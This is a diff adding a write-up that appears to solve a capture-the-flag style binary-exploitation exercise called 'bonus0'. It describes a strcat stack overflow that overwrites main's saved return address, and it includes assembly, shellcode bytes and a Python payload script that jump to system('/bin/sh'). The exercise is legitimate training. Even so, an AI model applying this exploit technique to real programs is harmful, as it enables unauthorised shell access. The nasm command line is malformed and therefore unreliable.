@@ -1,0 +1,63 @@
+This one has two functions in addition to the main
+
+main() allocates space for a 42 bytes buffer, and uses it as a parameter for
+a call to pp 
+pp() has two adjacent buffers (20 and 28 bytes), and sends them to p() as a parameter
+to gather a 20 char string from stdin
+It searches for the first instance of '\n' and replaces it with a '\0'
+and then strncpy() the first 20 characters of the input string,
+regardless of where the '\0' is.
+
+Because of the way they are filled, the two buffers can be used
+in strcat to overflow past their combined lenght when they are cat into
+the main() 42 bytes buffer, which will allow us to write on main's saved eip
+
+first p() call should be filled with 20 characters (and a terminating '\n' after)
+second p() call should be a combinaison of paddings and the new value for 
+main()'s saved eip
+Due to the nature of the exploit, the pads are tricky to get right
+
+Now that we can jump anywhere with main's eip, where do we jump ?
+On our own input, where we'll include a few opcodes that will setup
+the stack for a call to system() with a poiner to libc's "/bin/sh"
+as first parameter
+The easiest way to do so is to build a small elf32 asm program that does that
+and gather the compiled part where the opcodes are:
+
+
+global _start
+
+_start:
+	push 0xb7f8cc58 ; /bin/sh addr
+	push 0xb7e5ebe0 ; exit addr
+	push 0xb7e6b060 ; system addr
+	ret
+
+nasm -f -elf32 [smallcode.s] - o [smallcode.o]
+
+From there we gatrher the opcdoes with hexdhump
+and add them in the beginning of the buffer we point to
+(note : add 4 bytes of garbage first because it gets poped
+by the leave instruction in the main)
+\x68\x58\xcc\xf8\xb7\x68\xe0\xeb\xe5\xb7\x68\x60\xb0\xe6\xb7\xc3
+
+Because of the way gdb / ltrace and others behave with environement variables,
+you have to slightly alter the address of the buffer in the script
+(additionnal env variables cause the stack to slightly move down)
+
+Important note : because of the way p() gathers input, the first
+input must be 4096 bytes long in order to make sure the second read
+starts at the right place in our python script.
+
+
+firststraddr = "\xbf\xff\xf6\xe6"[::-1]
+opcodes = "\x68\x58\xcc\xf8\xb7\x68\xe0\xeb\xe5\xb7\x68\x60\xb0\xe6\xb7\xc3"
+padding = "A" * (4095 - len(opcodes))
+firststr = opcodes + padding + "\n"
+
+secondpad = "B" * 14
+secondstr = secondpad + firststraddr + "Y" + "\n"
+
+print firststr + secondstr
+
+(python script.py ; cat -) | ./bonus0
